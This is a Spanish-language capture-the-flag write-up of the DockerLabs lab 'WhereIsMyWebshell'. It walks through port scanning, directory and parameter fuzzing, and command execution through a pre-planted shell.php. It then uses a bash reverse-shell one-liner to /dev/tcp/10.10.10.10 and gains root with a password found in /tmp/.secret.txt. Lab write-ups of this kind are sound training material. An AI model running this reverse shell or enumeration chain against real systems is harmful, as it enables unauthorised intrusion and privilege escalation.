---
title: DockerLabs - WhereIsMyWebshell
summary: "Write-up del laboratorio WhereIsMyWebshell de DockerLabs"
author: elcybercurioso
date: 2025-10-27 13:00
categories: [Post, DockerLabs]
tags: [fácil, rce, parameter bruteforce, credentials leaking]
media_subpath: "/assets/img/posts/dockerlabs_whereismywebshell"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
└─$ nmap -sCV -p80 172.17.0.2                                  
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)
```

## análisis

Comenzamos revisando la pagina web alojada en el puerto 80 de la maquina, donde al final nos dan una pequeña pista de por donde empezar a escalar privilegios una vez obtengamos acceso:

![Desktop View](/20251027112023.webp){: width="972" height="589" .shadow}

Fuzzeamos en busca de recursos que puedan servirnos para obtener una consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos un recurso llamado `shell.php`, pero parece ser que necesitamos un parámetro el cual debemos pasarle para que se ejecute correctamente el script:

![Desktop View](/20251027113227.webp){: width="972" height="589" .shadow}

Tambien descubrimos que existe un fichero llamado `warning.html`, el cual nos da a entender que debemos fuzzear por el parámetro del fichero `shell.php`:

![Desktop View](/20251027112513.webp){: width="972" height="589" .shadow}

Tras fuzzear, encontramos cual es parámetro que podemos usar:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
└─$ wfuzz -c --hc=404,500 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/shell.php?FUZZ=whoami" -t 200 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/shell.php?FUZZ=whoami
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000004007:   200        2 L      2 W        21 Ch       "p********"                                                                                                                                       

Total time: 11.33796
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 569.1495
```

## explotación

Empleando el parámetro que hemos encontrado, podemos ejecutar comandos:

![Desktop View](/20251027114112.webp){: width="972" height="589" .shadow}

Teniendo esto ya definido, podemos obtener la consola con un payload básico de PHP:

```bash
bash -i >%26 /dev/tcp/10.10.10.10/9001 0>%261
```

Si nos hemos puesto en escucha antes de ejecutar el payload anterior, habremos obtenido una consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
└─$ nc -nlvp 4444  
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58404
www-data@d4d4dbf1a2c0:/var/www/html$ whoami
whoami
www-data
```

Tratamos la tty para poder operar en una consola completamente interactiva:

```bash
www-data@d4d4dbf1a2c0:~$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@d4d4dbf1a2c0:~$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                                                                  
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
└─$ stty raw -echo;fg             
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@d4d4dbf1a2c0:~$ export TERM=xterm
www-data@d4d4dbf1a2c0:~$ export SHELL=bash
www-data@d4d4dbf1a2c0:~$ stty rows 51 columns 211
```

## escalada de privilegios

Haciendo caso a la pista que nos dieron al principio, nos dirigimos a la carpeta `/tmp`, donde encontramos el fichero `.secret.txt`:

```bash
www-data@d4d4dbf1a2c0:/tmp$ ls -la
total 12
drwxrwxrwt 1 root root 4096 Oct 27 10:19 .
drwxr-xr-x 1 root root 4096 Oct 27 10:18 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
```

Y dentro, encontramos la que posiblemente sea la contraseña del usuario `root`:

```bash
www-data@d4d4dbf1a2c0:/tmp$ cat .secret.txt 
cont***************
```

Probamos a conectarnos como el usuario `root`, y validamos que efectivamente se trata de su contraseña:

```bash
www-data@d4d4dbf1a2c0:/tmp$ su root
Password: 
root@d4d4dbf1a2c0:/tmp# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>